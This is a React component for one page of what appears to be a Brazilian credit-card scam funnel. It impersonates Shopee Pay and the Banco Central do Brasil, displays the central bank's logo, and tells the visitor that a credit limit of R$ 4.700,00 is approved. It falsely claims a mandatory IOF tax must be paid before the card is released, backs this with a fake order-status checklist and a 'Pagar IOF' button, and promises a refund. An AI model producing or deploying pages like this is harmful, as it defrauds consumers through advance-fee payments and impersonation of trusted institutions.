import React from 'react';
import { CheckCircle, XCircle, AlertTriangle } from 'lucide-react';

interface TwentyFirstPageProps {
  onNext: () => void;
}

function TwentyFirstPage({ onNext }: TwentyFirstPageProps) {
  return (
    <div className="max-w-md px-4 py-8 flex-1 w-full">
      <div className="text-center mb-8">
        <h2 className="text-2xl font-bold mb-4 text-green-500">
          Parabéns, falta pouco para você receber o seu cartão de crédito!
        </h2>
        <p className="text-gray-600 mb-6">
          Você está a um passo de receber seu Cartão de Crédito, efetue o pagamento do imposto IOF (Imposto sobre Operações Financeiras) emitido pelo Banco Central para autorizar o seu limite de <span className="text-[#ff4d2d] font-bold">R$ 4.700,00</span>.
        </p>
      </div>

      <div className="bg-gray-100 p-6 rounded-lg shadow-md mb-8">
        <h3 className="text-xl font-bold mb-2 text-gray-800">O que é o IOF?</h3>
        <p className="text-gray-600 mb-4">
          A sigla IOF significa Imposto sobre Operações Financeiras. É um imposto federal cobrado em diferentes tipos de operações financeiras, como empréstimos, financiamentos, operações de câmbio e seguros.
        </p>
        <p className="text-gray-600 mb-4">
          No caso do seu cartão de crédito, o IOF é cobrado sobre o valor do limite de crédito aprovado. O pagamento desse imposto é obrigatório e é uma exigência do Banco Central do Brasil para a liberação do seu cartão.
        </p>
        <div className="flex justify-center mb-4">
          {/* Placeholder for a video explaining IOF */}
          <div className="w-full h-48 bg-gray-300 rounded-lg flex items-center justify-center">
            <span className="text-gray-500">Vídeo Explicativo sobre IOF</span>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <h3 className="text-lg font-bold mb-4 text-center">Status do seu pedido</h3>
        <div className="flex items-center mb-2">
          <CheckCircle className="text-green-500 mr-2" />
          <p className="text-gray-600">Simulação realizada e cadastro concluído</p>
        </div>
        <div className="flex items-center mb-2">
          <CheckCircle className="text-green-500 mr-2" />
          <p className="text-gray-600">Pagamento do Envio.</p>
        </div>
        <div className="flex items-center mb-2">
          <XCircle className="text-red-500 mr-2" />
          <p className="text-gray-600">Pagamento do Imposto IOF</p>
        </div>
        <div className="flex items-center mb-2">
          <AlertTriangle className="text-yellow-500 mr-2" />
          <p className="text-gray-600">Aguardando pagamento para liberação do crédito</p>
        </div>
        <div className="flex items-center">
          <AlertTriangle className="text-yellow-500 mr-2" />
          <p className="text-gray-600">Crédito na conta</p>
        </div>
      </div>

      <button onClick={onNext} className="w-full bg-[#ff4d2d] text-white py-3 rounded-lg font-bold hover:bg-[#ff6b4f] mb-4">
        Pagar IOF
      </button>

      <div className="bg-yellow-100 p-4 rounded-lg mb-4">
        <p className="text-yellow-700 text-sm">
          Nós da Shopee Pay não achamos justo ser cobrado este valor de nossos clientes, por isso todo valor pago nesta tarifa será reembolsado no seu cartão de crédito.
        </p>
      </div>
      <div className="flex justify-center">
        <img src="https://i.postimg.cc/02Md2Gvg/Banco-Central-do-Brasil-logo-1.png" alt="Banco Central do Brasil" className="h-16" />
      </div>
    </div>
  );
}

export default TwentyFirstPage;
